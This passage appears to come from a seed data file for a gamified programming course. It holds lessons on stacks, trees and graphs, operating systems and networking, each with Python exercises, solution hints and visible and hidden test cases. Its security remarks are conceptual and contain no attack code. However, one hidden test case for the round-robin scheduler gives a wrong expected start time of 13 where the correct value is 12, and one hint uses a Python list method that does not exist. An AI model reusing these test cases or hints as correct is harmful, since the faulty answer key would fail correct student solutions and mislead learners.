          { level: 2, content: 'The simplest solution: `return arr[::-1]`', xpCost: 10 },
          { level: 3, content: 'Complete: `def reverse_linked_list(arr): return arr[::-1]`', xpCost: 20 },
        ],
        testCases: [
          { input: 'reverse_linked_list([1, 2, 3, 4])', expectedOutput: '[4, 3, 2, 1]', isHidden: false, order: 1 },
          { input: 'reverse_linked_list([1])', expectedOutput: '[1]', isHidden: false, order: 2 },
          { input: 'reverse_linked_list([])', expectedOutput: '[]', isHidden: true, order: 3 },
          { input: 'reverse_linked_list([5, 4, 3, 2, 1])', expectedOutput: '[1, 2, 3, 4, 5]', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Min Stack',
        slug: 'min-stack',
        description: 'Write a class `MinStack` that supports `push(val)`, `pop()`, `top()`, and `get_min()` — all in O(1) time. Implement it by completing the methods. `top()` returns the top element, `get_min()` returns the minimum element currently in the stack.',
        starterCode: `class MinStack:
    def __init__(self):
        self.stack = []
        self.mins = []

    def push(self, val):
        # Push value onto stack, track minimum
        pass

    def pop(self):
        # Remove top element
        pass

    def top(self):
        # Return top element without removing
        pass

    def get_min(self):
        # Return minimum element in the stack
        pass`,
        language: 'python',
        order: 3,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Maintain two stacks: one for values, one for minimums. On push, also push the current minimum to the mins stack. On pop, pop from both stacks.', xpCost: 5 },
          { level: 2, content: 'push: `self.stack.append(val); self.mins.append(min(val, self.mins[-1] if self.mins else val))`. pop: `self.stack.pop(); self.mins.pop()`. top: `return self.stack[-1]`. get_min: `return self.mins[-1]`.', xpCost: 10 },
          { level: 3, content: 'Complete: maintain two parallel stacks. The mins stack always has the current minimum at its top, so get_min is O(1).', xpCost: 20 },
        ],
        testCases: [
          { input: 's=MinStack(); s.push(5); s.push(3); s.push(7); str(s.get_min())', expectedOutput: '3', isHidden: false, order: 1 },
          { input: 's=MinStack(); s.push(5); s.push(3); s.push(7); s.pop(); str(s.get_min())', expectedOutput: '3', isHidden: false, order: 2 },
          { input: 's=MinStack(); s.push(5); s.push(3); s.pop(); str(s.get_min())', expectedOutput: '5', isHidden: true, order: 3 },
          { input: 's=MinStack(); s.push(-2); str(s.get_min())', expectedOutput: '-2', isHidden: true, order: 4 },
          { input: 's=MinStack(); s.push(1); s.push(2); str(s.top())', expectedOutput: '2', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Evaluate Postfix',
        slug: 'evaluate-postfix',
        description: 'Write a function `eval_postfix(expr)` that takes a string of space-separated tokens (operands and operators +, -, *, /) in postfix notation and returns the integer result. Use integer division for `/`. For example, `eval_postfix("3 4 + 2 *")` returns `14`.',
        starterCode: `def eval_postfix(expr):
    # Evaluate postfix expression, return integer result
    pass`,
        language: 'python',
        order: 4,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Use a stack. Split the expression by spaces. For each token: if it is a number, push it; if it is an operator, pop two operands, apply the operator, and push the result.', xpCost: 5 },
          { level: 2, content: 'Split by spaces. For each token: `if token in "+-*/": b=stack.pop(); a=stack.pop(); stack.push(apply(a,b,token))` else `stack.append(int(token))`. Return stack[0].', xpCost: 10 },
          { level: 3, content: 'Note: for division, pop the second operand first (it is the divisor). Use `int(a / b)` for integer division with correct truncation toward zero.', xpCost: 20 },
        ],
        testCases: [
          { input: 'eval_postfix("3 4 + 2 *")', expectedOutput: '14', isHidden: false, order: 1 },
          { input: 'eval_postfix("5 1 2 + 4 * + 3 -")', expectedOutput: '14', isHidden: false, order: 2 },
          { input: 'eval_postfix("2 3 *")', expectedOutput: '6', isHidden: true, order: 3 },
          { input: 'eval_postfix("10 2 /")', expectedOutput: '5', isHidden: true, order: 4 },
          { input: 'eval_postfix("4 13 5 / +")', expectedOutput: '6', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Daily Temperatures',
        slug: 'daily-temperatures',
        description: 'Write a function `daily_temperatures(temps)` that takes a list of daily temperatures and returns a list where each element is the number of days you have to wait until a warmer temperature. If no warmer day exists, use 0. For example, `daily_temperatures([73, 74, 75, 71, 69, 72, 76, 73])` returns `[1, 1, 4, 2, 1, 1, 0, 0]`.',
        starterCode: `def daily_temperatures(temps):
    # For each day, how many days until a warmer temperature?
    pass`,
        language: 'python',
        order: 5,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Use a monotonic stack that stores indices. For each temperature, pop all previous days that are cooler and set their answer. Push the current index.', xpCost: 5 },
          { level: 2, content: 'Initialize result array of zeros and empty stack. For each index i: while stack and temps[i] > temps[stack[-1]]: prev = stack.pop(); result[prev] = i - prev. Then stack.append(i).', xpCost: 10 },
          { level: 3, content: 'Complete: use a stack to track indices of days waiting for warmer temps. When a warmer day is found, calculate the distance for all cooler days on the stack.', xpCost: 20 },
        ],
        testCases: [
          { input: 'daily_temperatures([73, 74, 75, 71, 69, 72, 76, 73])', expectedOutput: '[1, 1, 4, 2, 1, 1, 0, 0]', isHidden: false, order: 1 },
          { input: 'daily_temperatures([30, 40, 50, 60])', expectedOutput: '[1, 1, 1, 0]', isHidden: false, order: 2 },
          { input: 'daily_temperatures([30, 60, 90])', expectedOutput: '[1, 1, 0]', isHidden: true, order: 3 },
          { input: 'daily_temperatures([90, 80, 70])', expectedOutput: '[0, 0, 0]', isHidden: true, order: 4 },
          { input: 'daily_temperatures([50])', expectedOutput: '[0]', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Queue Using Stacks',
        slug: 'queue-using-stacks',
        description: 'Write a class `QueueUsingStacks` that implements a FIFO queue using two stacks (lists). Implement `enqueue(val)` to add an element, and `dequeue()` to remove and return the front element. Raise IndexError with message "Queue is empty" if dequeue is called on an empty queue.',
        starterCode: `class QueueUsingStacks:
    def __init__(self):
        self.in_stack = []
        self.out_stack = []

    def enqueue(self, val):
        # Add element to the queue
        pass

    def dequeue(self):
        # Remove and return the front element
        pass`,
        language: 'python',
        order: 6,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Push to in_stack for enqueue. For dequeue, if out_stack is empty, move all elements from in_stack to out_stack (reversing order), then pop from out_stack.', xpCost: 5 },
          { level: 2, content: 'enqueue: `self.in_stack.append(val)`. dequeue: if both stacks empty, raise IndexError. If out_stack empty: `while self.in_stack: self.out_stack.append(self.in_stack.pop())`. Return `self.out_stack.pop()`.', xpCost: 10 },
          { level: 3, content: 'Complete: push to in_stack, pop from out_stack. Transfer elements only when out_stack is empty. This gives amortized O(1) operations.', xpCost: 20 },
        ],
        testCases: [
          { input: 'q=QueueUsingStacks(); q.enqueue(1); q.enqueue(2); str(q.dequeue())', expectedOutput: '1', isHidden: false, order: 1 },
          { input: 'q=QueueUsingStacks(); q.enqueue(1); q.enqueue(2); q.dequeue(); str(q.dequeue())', expectedOutput: '2', isHidden: false, order: 2 },
          { input: 'q=QueueUsingStacks(); q.enqueue(10); q.enqueue(20); q.dequeue(); q.enqueue(30); str(q.dequeue())', expectedOutput: '20', isHidden: true, order: 3 },
          { input: 'q=QueueUsingStacks(); q.enqueue(5); str(q.dequeue())', expectedOutput: '5', isHidden: true, order: 4 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 6

  // Lesson 2.3: Trees & Graphs
  const lesson2_3 = await createLessonWithExercises(phases[1].id, {
    title: 'Trees & Graphs',
    slug: 'trees-and-graphs',
    description: 'Explore tree traversals, binary search, and graph algorithms. These structures model hierarchies, networks, and relationships — essential for both software and security.',
    contentMdx: `# Trees & Graphs

Trees and graphs are the data structures that model relationships — file systems, network topologies, social connections, and dependency chains all use these structures.

## Binary Search

Before trees, let us master **binary search** — the algorithm that tree structures are built upon. Binary search finds an element in a **sorted** array in O(log n) time by repeatedly halving the search space:

\`\`\`python
def binary_search(arr, target):
    left, right = 0, len(arr) - 1
    while left <= right:
        mid = (left + right) // 2
        if arr[mid] == target:
            return mid
        elif arr[mid] < target:
            left = mid + 1
        else:
            right = mid - 1
    return -1
\`\`\`

The key insight: each comparison eliminates **half** of the remaining elements. In an array of 1 billion elements, binary search needs at most 30 comparisons!

## Tree Traversals

A binary tree has three fundamental traversal orders:

1. **In-order** (Left, Root, Right) — produces sorted output for BSTs
2. **Pre-order** (Root, Left, Right) — useful for copying trees
3. **Post-order** (Left, Right, Root) — useful for deleting trees

\`\`\`python
def inorder(node):
    if node:
        inorder(node.left)
        print(node.val)
        inorder(node.right)
\`\`\`

## Graphs

A graph consists of **vertices** (nodes) and **edges** (connections). Graphs can be:
- **Directed** (one-way edges) or **undirected** (two-way)
- **Weighted** (edges have costs) or **unweighted**
- **Cyclic** (contains cycles) or **acyclic** (no cycles)

### Depth-First Search (DFS)

DFS explores as deep as possible along each branch before backtracking:

\`\`\`python
def dfs(graph, start, visited=None):
    if visited is None:
        visited = set()
    visited.add(start)
    for neighbor in graph[start]:
        if neighbor not in visited:
            dfs(graph, neighbor, visited)
    return visited
\`\`\`

### Breadth-First Search (BFS)

BFS explores all neighbors at the current depth before moving deeper:

\`\`\`python
from collections import deque

def bfs(graph, start):
    visited = set([start])
    queue = deque([start])
    while queue:
        node = queue.popleft()
        for neighbor in graph[node]:
            if neighbor not in visited:
                visited.add(neighbor)
                queue.append(neighbor)
    return visited
\`\`\`

## Security Applications

- **Network mapping**: Graphs model network topologies for attack path analysis
- **File system traversal**: Trees model directory structures for forensic analysis
- **Dependency analysis**: Graphs model software dependencies for vulnerability propagation
- **Binary search**: Used in fuzzing to find exact crash boundaries

Trees and graphs are the backbone of both software architecture and security analysis.`,
    order: 3,
    xpReward: 60,
    category: 'cs',
    exercises: [
      {
        title: 'Binary Search',
        slug: 'binary-search',
        description: 'Write a function `binary_search(arr, target)` that takes a sorted list of integers and a target integer, and returns the index of the target if found, or -1 if not found.',
        starterCode: `def binary_search(arr, target):
    # Return index of target in sorted arr, or -1 if not found
    pass`,
        language: 'python',
        order: 1,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Use two pointers `left` and `right`. Calculate `mid = (left + right) // 2`. Compare arr[mid] to target and narrow the search range.', xpCost: 5 },
          { level: 2, content: 'While left <= right: mid = (left+right)//2; if arr[mid]==target: return mid; elif arr[mid]<target: left=mid+1; else: right=mid-1. Return -1 after loop.', xpCost: 10 },
          { level: 3, content: 'Complete: `def binary_search(arr, target): l, r = 0, len(arr)-1; while l<=r: m=(l+r)//2; if arr[m]==target: return m; l, r = (m+1, r) if arr[m]<target else (l, m-1); return -1`', xpCost: 20 },
        ],
        testCases: [
          { input: 'binary_search([1, 3, 5, 7, 9], 5)', expectedOutput: '2', isHidden: false, order: 1 },
          { input: 'binary_search([1, 3, 5, 7, 9], 4)', expectedOutput: '-1', isHidden: false, order: 2 },
          { input: 'binary_search([2, 4, 6, 8, 10, 12], 8)', expectedOutput: '3', isHidden: true, order: 3 },
          { input: 'binary_search([1], 1)', expectedOutput: '0', isHidden: true, order: 4 },
          { input: 'binary_search([], 5)', expectedOutput: '-1', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'DFS Traversal',
        slug: 'dfs-traversal',
        description: 'Write a function `dfs(graph, start)` that takes an adjacency list (dict mapping nodes to lists of neighbors) and a start node, and returns a list of nodes visited in DFS order.',
        starterCode: `def dfs(graph, start):
    # Return list of nodes in DFS order
    pass`,
        language: 'python',
        order: 2,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Use recursion or an explicit stack. Keep a `visited` set and a `result` list. Mark start as visited, add to result, then recursively visit each unvisited neighbor.', xpCost: 5 },
          { level: 2, content: 'Create visited set and result list. Define inner function: `def _dfs(node): visited.add(node); result.append(node); [\\_dfs(n) for n in graph[node] if n not in visited]`. Call _dfs(start) and return result.', xpCost: 10 },
          { level: 3, content: 'Complete iterative: `def dfs(g, s): visited, result, stack = set(), [], [s]; while stack: n = stack.pop(); if n not in visited: visited.add(n); result.append(n); stack.extend(reversed(g.get(n, []))); return result`', xpCost: 20 },
        ],
        testCases: [
          { input: 'dfs({0: [1, 2], 1: [0, 3], 2: [0], 3: [1]}, 0)', expectedOutput: '[0, 1, 3, 2]', isHidden: false, order: 1 },
          { input: 'dfs({0: [1], 1: [0, 2], 2: [1]}, 0)', expectedOutput: '[0, 1, 2]', isHidden: false, order: 2 },
          { input: 'dfs({0: [1, 2], 1: [0], 2: [0, 3, 4], 3: [2], 4: [2]}, 2)', expectedOutput: '[2, 0, 1, 3, 4]', isHidden: true, order: 3 },
          { input: 'dfs({0: []}, 0)', expectedOutput: '[0]', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'BFS Traversal',
        slug: 'bfs-traversal',
        description: 'Write a function `bfs(graph, start)` that takes an adjacency list (dict mapping nodes to lists of neighbors) and a start node, and returns a list of nodes visited in BFS order.',
        starterCode: `from collections import deque

def bfs(graph, start):
    # Return list of nodes in BFS order
    pass`,
        language: 'python',
        order: 3,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Use a queue (deque). Start by adding the start node. While the queue is not empty, dequeue a node, add it to result, and enqueue all unvisited neighbors.', xpCost: 5 },
          { level: 2, content: 'Initialize: `visited = set([start]); queue = deque([start]); result = []`. While queue: `node = queue.popleft(); result.append(node); for n in graph.get(node, []): if n not in visited: visited.add(n); queue.append(n)`.', xpCost: 10 },
          { level: 3, content: 'Complete: use deque for efficient popleft. Track visited set to avoid revisiting nodes. Return result list.', xpCost: 20 },
        ],
        testCases: [
          { input: 'bfs({0: [1, 2], 1: [0, 3], 2: [0], 3: [1]}, 0)', expectedOutput: '[0, 1, 2, 3]', isHidden: false, order: 1 },
          { input: 'bfs({0: [1], 1: [0, 2], 2: [1]}, 0)', expectedOutput: '[0, 1, 2]', isHidden: false, order: 2 },
          { input: 'bfs({0: [1, 2], 1: [0], 2: [0, 3, 4], 3: [2], 4: [2]}, 0)', expectedOutput: '[0, 1, 2, 3, 4]', isHidden: true, order: 3 },
          { input: 'bfs({0: []}, 0)', expectedOutput: '[0]', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Max Depth of Tree',
        slug: 'max-depth-of-tree',
        description: 'Write a function `max_depth(tree)` that takes a nested list representing a tree and returns its maximum depth. Each element is either a leaf (non-list value) or a subtree (list). The depth of a leaf is 1. For example, `max_depth([1, [2, 3], [4, [5, 6]]])` returns `3`.',
        starterCode: `def max_depth(tree):
    # Return the maximum depth of the nested list tree
    pass`,
        language: 'python',
        order: 4,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Use recursion. For a list, the depth is 1 + the maximum depth of its elements. For a non-list element, return 1.', xpCost: 5 },
          { level: 2, content: 'If tree is not a list, return 1. If tree is a list: `return 1 + max(max_depth(item) for item in tree)` (or 1 if empty).', xpCost: 10 },
          { level: 3, content: 'Complete: `def max_depth(t): return 1 if not isinstance(t, list) else (1 + max((max_depth(x) for x in t), default=0))`', xpCost: 20 },
        ],
        testCases: [
          { input: 'max_depth([1, [2, 3], [4, [5, 6]]])', expectedOutput: '3', isHidden: false, order: 1 },
          { input: 'max_depth([1, 2, 3])', expectedOutput: '2', isHidden: false, order: 2 },
          { input: 'max_depth(42)', expectedOutput: '1', isHidden: true, order: 3 },
          { input: 'max_depth([[[1]]])', expectedOutput: '4', isHidden: true, order: 4 },
          { input: 'max_depth([])', expectedOutput: '1', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Binary Tree Inversion',
        slug: 'binary-tree-inversion',
        description: 'Write a function `invert_tree(tree)` that takes a nested list representing a binary tree and returns the inverted tree (swap left and right at every level). Each node is either a leaf value or a list `[left, right]`. For example, `invert_tree([[1, 2], [3, 4]])` returns `[[3, 4], [1, 2]]`. Leaf values remain unchanged.',
        starterCode: `def invert_tree(tree):
    # Invert (mirror) a binary tree represented as nested lists
    pass`,
        language: 'python',
        order: 5,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Use recursion. If the tree is not a list, it is a leaf — return it as-is. If it is a list of two elements, recursively invert both and swap their positions.', xpCost: 5 },
          { level: 2, content: 'If not isinstance(tree, list): return tree. Else: return [invert_tree(tree[1]), invert_tree(tree[0])].', xpCost: 10 },
          { level: 3, content: 'Complete: `def invert_tree(t): return t if not isinstance(t, list) else [invert_tree(t[1]), invert_tree(t[0])]`', xpCost: 20 },
        ],
        testCases: [
          { input: 'invert_tree([[1, 2], [3, 4]])', expectedOutput: '[[3, 4], [1, 2]]', isHidden: false, order: 1 },
          { input: 'invert_tree(42)', expectedOutput: '42', isHidden: false, order: 2 },
          { input: 'invert_tree([[[1, 2], 3], [4, [5, 6]]])', expectedOutput: '[[4, [5, 6]], [[1, 2], 3]]', isHidden: true, order: 3 },
          { input: 'invert_tree([7, 8])', expectedOutput: '[8, 7]', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Graph Cycle Detector',
        slug: 'graph-cycle-detector',
        description: 'Write a function `has_cycle(graph)` that takes an adjacency list (dict mapping nodes to lists of neighbors) for a directed graph and returns `True` if the graph contains a cycle, `False` otherwise. For example, `has_cycle({0: [1], 1: [2], 2: [0]})` returns `True`, `has_cycle({0: [1], 1: [2], 2: []})` returns `False`.',
        starterCode: `def has_cycle(graph):
    # Detect if a directed graph has a cycle
    pass`,
        language: 'python',
        order: 6,
        xpReward: 40,
        hints: [
          { level: 1, content: 'Use DFS with three states: unvisited, visiting (in current path), visited (fully explored). If you reach a "visiting" node during DFS, you found a cycle.', xpCost: 5 },
          { level: 2, content: 'Create state dict: 0=unvisited, 1=visiting, 2=visited. For each unvisited node, run DFS. In DFS: mark as visiting, recurse on neighbors. If any neighbor is visiting → cycle. After all neighbors, mark as visited.', xpCost: 10 },
          { level: 3, content: 'Complete: implement DFS with coloring. Return True immediately if a back edge (to a visiting node) is found. Return False only after all nodes are fully explored with no back edges.', xpCost: 20 },
        ],
        testCases: [
          { input: 'has_cycle({0: [1], 1: [2], 2: [0]})', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'has_cycle({0: [1], 1: [2], 2: []})', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'has_cycle({0: [1], 1: [0]})', expectedOutput: 'True', isHidden: true, order: 3 },
          { input: 'has_cycle({0: [], 1: [], 2: []})', expectedOutput: 'False', isHidden: true, order: 4 },
          { input: 'has_cycle({0: [1, 2], 1: [2], 2: [3], 3: [1]})', expectedOutput: 'True', isHidden: true, order: 5 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 6

  // ============================================================
  // PHASE 3: SYSTEMS & NETWORKS
  // ============================================================

  // Lesson 3.1: Operating Systems
  const lesson3_1 = await createLessonWithExercises(phases[2].id, {
    title: 'Operating Systems',
    slug: 'operating-systems',
    description: 'Understand how operating systems manage processes, memory, and file systems — the foundation for both system programming and security.',
    contentMdx: `# Operating Systems

The operating system is the software layer between your programs and the hardware. Understanding how it works is essential for writing efficient code, debugging performance issues, and — critically — understanding how attackers exploit system-level vulnerabilities.

## What an OS Does

An operating system manages three core resources:

1. **Processes** — Which programs run and when (CPU scheduling)
2. **Memory** — Which data lives where (memory management)
3. **Storage** — How files are organized (file systems)

## Processes

A **process** is a running instance of a program. The OS assigns each process a **Process ID (PID)** and manages its lifecycle:

- **Created** → **Ready** → **Running** → **Waiting** → **Terminated**

### CPU Scheduling Algorithms

The OS must decide which ready process gets the CPU next. Common algorithms:

| Algorithm | Description | Pros | Cons |
|-----------|-------------|------|------|
| **FCFS** | First Come, First Served | Simple, fair | Long wait times (convoy effect) |
| **SJF** | Shortest Job First | Optimal avg wait | Needs execution time prediction |
| **Round Robin** | Each process gets a time quantum | Fair, responsive | Context switch overhead |
| **Priority** | Higher priority goes first | Flexible | Starvation possible |

### Round Robin Scheduling

Round Robin is the most common interactive scheduling algorithm. Each process gets a fixed **time quantum** (e.g., 10ms). When the quantum expires, the process is moved to the back of the queue:

\`\`\`
Queue: [P1, P2, P3]  Quantum: 4
P1 runs 4 units → remaining: 2 → moves to back
P2 runs 4 units → remaining: 1 → moves to back
P3 runs 4 units → done!
P1 runs 2 units → done!
P2 runs 1 unit → done!
\`\`\`

## Memory Management

### Virtual Memory

Each process thinks it has the entire address space to itself. The OS maps **virtual addresses** to **physical addresses** using page tables:

\`\`\`
Virtual Address → [Page Table] → Physical Address
\`\`\`

### Stack vs Heap

- **Stack**: Fixed-size, LIFO, automatic management (function calls, local variables)
- **Heap**: Dynamic size, manual management (\`malloc\`/\`free\`), fragmentation risk

**Buffer overflows** happen when data written to a stack buffer overflows into adjacent memory — potentially overwriting return addresses.

## File Systems

The OS organizes data into a hierarchical structure:
- **Inodes** store file metadata (permissions, size, timestamps)
- **Directories** map names to inodes
- **Permissions** control who can read, write, or execute

Understanding permissions is crucial for security: misconfigured file permissions are one of the most common attack vectors.

## Security Implications

- **Privilege escalation**: Exploiting OS bugs to gain higher permissions
- **Race conditions**: Exploiting timing gaps in OS operations
- **Memory leaks**: Poor memory management leading to denial of service
- **File permission attacks**: Exploiting misconfigured access controls

The operating system is both your shield and your attack surface. Understanding it deeply makes you both a better developer and a more effective security professional.`,
    order: 1,
    xpReward: 60,
    category: 'cs',
    exercises: [
      {
        title: 'Process Scheduler',
        slug: 'process-scheduler',
        description: 'Write a function `round_robin(processes, quantum)` that simulates Round Robin CPU scheduling. `processes` is a list of tuples `(name, burst_time)`. Return a list of tuples `(name, time_started)` showing the order processes execute. Each process runs for min(quantum, remaining_burst_time) units.',
        starterCode: `def round_robin(processes, quantum):
    # Simulate Round Robin scheduling
    # processes: list of (name, burst_time) tuples
    # Return list of (name, time_started) tuples
    pass`,
        language: 'python',
        order: 1,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Use a queue. Track remaining burst time for each process and current time. While the queue is not empty, dequeue a process, run it for min(quantum, remaining), record the start time, and re-enqueue if it still has burst time left.', xpCost: 5 },
          { level: 2, content: 'Initialize: queue = deque(processes as [name, remaining] lists), time = 0, result = []. While queue: pop left, run for min(quantum, remaining), append (name, time) to result, increment time, if remaining > 0 append back to queue.', xpCost: 10 },
          { level: 3, content: 'Complete: Use a queue of [name, remaining] lists. Loop while queue. Each iteration: pop, execute for min(quantum, remaining), record start time, update time, re-enqueue if remaining > 0. Return result.', xpCost: 20 },
        ],
        testCases: [
          { input: 'round_robin([("P1", 6), ("P2", 4)], 4)', expectedOutput: "[('P1', 0), ('P2', 4), ('P1', 8)]", isHidden: false, order: 1 },
          { input: 'round_robin([("A", 3)], 4)', expectedOutput: "[('A', 0)]", isHidden: false, order: 2 },
          { input: 'round_robin([("X", 8), ("Y", 4), ("Z", 2)], 3)', expectedOutput: "[('X', 0), ('Y', 3), ('Z', 6), ('X', 8), ('Y', 11), ('X', 13)]", isHidden: true, order: 3 },
          { input: 'round_robin([("P1", 10)], 2)', expectedOutput: "[('P1', 0), ('P1', 2), ('P1', 4), ('P1', 6), ('P1', 8)]", isHidden: true, order: 4 },
        ],
      },
      {
        title: 'File Permission Parser',
        slug: 'file-permission-parser',
        description: 'Write a function `parse_permissions(perm_string)` that takes a Linux permission string like `"-rwxr-xr--"` and returns a dict with keys `"type"`, `"owner"`, `"group"`, `"others"`. The type is "file" for `-` or "directory" for `d`. Each permission is a string of granted permissions (e.g., `"rwx"`, `"r-x"`, `"r--"`).',
        starterCode: `def parse_permissions(perm_string):
    # Parse Linux permission string into structured dict
    pass`,
        language: 'python',
        order: 2,
        xpReward: 30,
        hints: [
          { level: 1, content: 'The first character is the type. The next 3 are owner, next 3 group, next 3 others. Simply slice the string into these segments.', xpCost: 5 },
          { level: 2, content: 'Return: `{"type": "directory" if perm_string[0]=="d" else "file", "owner": perm_string[1:4], "group": perm_string[4:7], "others": perm_string[7:10]}`', xpCost: 10 },
          { level: 3, content: 'Complete: slice positions 0, 1:4, 4:7, 7:10 and map the first char to "file" or "directory".', xpCost: 20 },
        ],
        testCases: [
          { input: 'parse_permissions("-rwxr-xr--")', expectedOutput: "{'type': 'file', 'owner': 'rwx', 'group': 'r-x', 'others': 'r--'}", isHidden: false, order: 1 },
          { input: 'parse_permissions("drwxrwxrwx")', expectedOutput: "{'type': 'directory', 'owner': 'rwx', 'group': 'rwx', 'others': 'rwx'}", isHidden: false, order: 2 },
          { input: 'parse_permissions("-rw-------")', expectedOutput: "{'type': 'file', 'owner': 'rw-', 'group': '---', 'others': '---'}", isHidden: true, order: 3 },
          { input: 'parse_permissions("-r--r--r--")', expectedOutput: "{'type': 'file', 'owner': 'r--', 'group': 'r--', 'others': 'r--'}", isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Memory Allocator',
        slug: 'memory-allocator',
        description: 'Write a function `first_fit_allocate(memory_blocks, process_sizes)` that simulates first-fit memory allocation. `memory_blocks` is a list of available block sizes. `process_sizes` is a list of process sizes to allocate. Return a list of allocations where each element is the block index allocated to each process, or -1 if no suitable block was found. When a block is allocated, subtract the process size from the block.',
        starterCode: `def first_fit_allocate(memory_blocks, process_sizes):
    # Simulate first-fit memory allocation
    # Return list of block indices (or -1 if unallocated)
    pass`,
        language: 'python',
        order: 3,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Make a copy of memory_blocks. For each process, scan blocks left to right. Find the first block >= process size. Record its index and reduce the block size.', xpCost: 5 },
          { level: 2, content: 'Copy blocks: `blocks = list(memory_blocks)`. For each process: iterate blocks, find first where `blocks[i] >= size`. If found: `allocations.append(i); blocks[i] -= size`. Else: `allocations.append(-1)`.', xpCost: 10 },
          { level: 3, content: 'Complete: use a mutable copy of blocks, iterate processes, for each find the first fitting block, reduce remaining space, record index.', xpCost: 20 },
        ],
        testCases: [
          { input: 'first_fit_allocate([100, 500, 200, 300, 600], [212, 417, 112, 426])', expectedOutput: '[1, 4, 1, -1]', isHidden: false, order: 1 },
          { input: 'first_fit_allocate([100, 200], [50, 150])', expectedOutput: '[0, 1]', isHidden: false, order: 2 },
          { input: 'first_fit_allocate([100], [200])', expectedOutput: '[-1]', isHidden: true, order: 3 },
          { input: 'first_fit_allocate([300, 200, 400], [150, 250, 50])', expectedOutput: '[0, 2, 0]', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Deadlock Detector',
        slug: 'deadlock-detector',
        description: 'Write a function `detect_deadlock(allocation, request)` that takes two dicts: `allocation` maps process IDs to the resource they currently hold, and `request` maps process IDs to the resource they are waiting for. A deadlock exists if there is a cycle: P1 holds R1, wants R2; P2 holds R2, wants R1. Return `True` if deadlock exists, `False` otherwise.',
        starterCode: `def detect_deadlock(allocation, request):
    # Detect circular wait (deadlock) in resource allocation
    pass`,
        language: 'python',
        order: 4,
        xpReward: 40,
        hints: [
          { level: 1, content: 'Build a wait-for graph: for each process, it waits for the process that holds the resource it wants. Then detect a cycle in this graph using DFS.', xpCost: 5 },
          { level: 2, content: 'Map resources to their owners: `resource_owner = {v: k for k, v in allocation.items()}`. For each process, if its requested resource has an owner, that process waits for the owner. Detect cycle in the wait-for graph.', xpCost: 10 },
          { level: 3, content: 'Complete: build a directed graph of "waits-for" relationships, then use cycle detection (DFS with coloring) to find circular waits.', xpCost: 20 },
        ],
        testCases: [
          { input: 'detect_deadlock({"P1": "R1", "P2": "R2"}, {"P1": "R2", "P2": "R1"})', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'detect_deadlock({"P1": "R1"}, {"P2": "R2"})', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'detect_deadlock({"P1": "R1", "P2": "R2", "P3": "R3"}, {"P1": "R2", "P2": "R3", "P3": "R1"})', expectedOutput: 'True', isHidden: true, order: 3 },
          { input: 'detect_deadlock({"P1": "R1"}, {"P1": "R2"})', expectedOutput: 'False', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'LRU Cache',
        slug: 'lru-cache',
        description: 'Write a class `LRUCache` with `__init__(capacity)`, `get(key)`, and `put(key, value)`. `get` returns the value if key exists (and marks it as recently used), else -1. `put` adds/updates the key-value pair. When capacity is exceeded, evict the least recently used item. Use OrderedDict for O(1) operations.',
        starterCode: `from collections import OrderedDict

class LRUCache:
    def __init__(self, capacity):
        # Initialize LRU cache with given capacity
        pass

    def get(self, key):
        # Return value if exists, else -1
        pass

    def put(self, key, value):
        # Add or update key-value pair
        pass`,
        language: 'python',
        order: 5,
        xpReward: 40,
        hints: [
          { level: 1, content: 'Use OrderedDict: on get, move the key to the end (most recent). On put, add/update and move to end. If over capacity, popitem(last=False) to remove LRU.', xpCost: 5 },
          { level: 2, content: 'get: `if key in self.cache: self.cache.move_to_end(key); return self.cache[key]; return -1`. put: `self.cache[key]=value; self.cache.move_to_end(key); if len(self.cache)>self.capacity: self.cache.popitem(last=False)`.', xpCost: 10 },
          { level: 3, content: 'Complete: OrderedDict maintains insertion order. move_to_end marks as recently used. popitem(last=False) removes the first (oldest) item.', xpCost: 20 },
        ],
        testCases: [
          { input: 'c=LRUCache(2); c.put(1,1); c.put(2,2); str(c.get(1))', expectedOutput: '1', isHidden: false, order: 1 },
          { input: 'c=LRUCache(2); c.put(1,1); c.put(2,2); c.get(1); c.put(3,3); str(c.get(2))', expectedOutput: '-1', isHidden: false, order: 2 },
          { input: 'c=LRUCache(1); c.put(1,10); c.put(2,20); str(c.get(1))', expectedOutput: '-1', isHidden: true, order: 3 },
          { input: 'c=LRUCache(2); c.put(1,1); c.put(2,2); c.get(1); c.put(3,3); c.get(2); c.put(4,4); str(c.get(1))', expectedOutput: '-1', isHidden: true, order: 4 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 5

  // Lesson 3.2: Networking Fundamentals
  const lesson3_2 = await createLessonWithExercises(phases[2].id, {
    title: 'Networking Fundamentals',
    slug: 'networking-fundamentals',
    description: 'Learn how computers communicate — TCP/IP, DNS, HTTP, and the protocols that power the internet. This knowledge is essential for understanding network security.',
    contentMdx: `# Networking Fundamentals

Every cybersecurity professional must understand networking. Networks are the battlefield where most attacks occur, and you cannot defend what you do not understand.

## The OSI Model

The **Open Systems Interconnection (OSI)** model divides networking into 7 layers:

| Layer | Name | Example Protocols | What It Does |
|-------|------|-------------------|-------------|
